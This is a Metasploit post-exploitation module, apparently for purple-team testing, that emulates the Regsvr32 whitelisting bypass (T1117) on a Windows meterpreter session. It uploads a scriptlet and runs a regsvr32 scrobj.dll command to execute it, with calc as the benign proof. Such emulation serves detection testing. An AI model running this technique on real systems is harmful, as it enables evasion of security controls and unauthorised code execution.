##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Post::Windows::Purple
  include Msf::Exploit::FileDropper

  def initialize(info={})
    super(update_info(info,
                      'Name'          => 'Regsvr32 (T1117) Windows - Purple Team',
                      'Description'   => %q{ Defense Evasion, Execution: Regsvr32.exe is a command-line program used to register and unregister object linking and embedding controls, including dynamic link libraries (DLLs), on Windows systems. Regsvr32.exe can be used to execute arbitrary binaries.

Adversaries may take advantage of this functionality to proxy execution of code to avoid triggering security tools that may not monitor execution of, and modules loaded by, the regsvr32.exe process because of whitelists or false positives from Windows using regsvr32.exe for normal operations. Regsvr32.exe is also a Microsoft signed binary.

Regsvr32.exe can also be used to specifically bypass process whitelisting using functionality to load COM scriptlets to execute DLLs under user permissions. Since regsvr32.exe is network and proxy aware, the scripts can be loaded by passing a uniform resource locator (URL) to file on an external Web server as an argument during invocation. This method makes no changes to the Registry as the COM object is not actually registered, only executed. This variation of the technique has been used in campaigns targeting governments.},
                      'License'       => MSF_LICENSE,
                      'Author'        => [ 'Praetorian' ],
                      'References'    => [ [ 'URL', 'https://attack.mitre.org/wiki/Technique/T1117' ],
                      [ 'URL', 'https://github.com/redcanaryco/atomic-red-team/tree/master/atomics/T1117' ],
                      [ 'URL', 'https://web.archive.org/web/20161128183535/https://subt0x10.blogspot.com/2016/04/bypass-application-whitelisting-script.html' ] ],
                      'Platform'      => [ 'win' ],
                      'SessionTypes'  => [ 'meterpreter' ]
                     ))
    register_options(
    [
      OptString.new('PATH', [ true, 'Path to upload sct file to','C:\\t1117.sct']),
      OptString.new('FILE', [ true, 'Local path of the sct file',::File.join(Msf::Config.install_root, "data", "purple", "t1117", "RegSvr32.sct")]),
      OptBool.new('CLEANUP', [true, "Cleanup", true])
    ])
  end

  def run
    begin
      return 0 if session.type != "meterpreter"

      sct_path = datastore['PATH']
      l_path = datastore['FILE']

      print_status("Uploading sct file")
      unless exist?(sct_path)
        upload_file(sct_path, l_path)
      end

      print_status("Executing regsvr32 command")
      cmd="regsvr32.exe /s /u /i:#{sct_path} scrobj.dll"
      run_cmd(cmd, false)

      sleep(2)

      print_status("Checking for calc running")

      kill_calc(true)

      if datastore['CLEANUP']
        register_files_for_cleanup(sct_path)
      end
      print_good("Module T1117 execution successful.")

    rescue ::Exception => e
      print_status("Unable to execute: #{e.message}")
      print_error("Module T1117 execution failed.")
      return
    end
  end
end
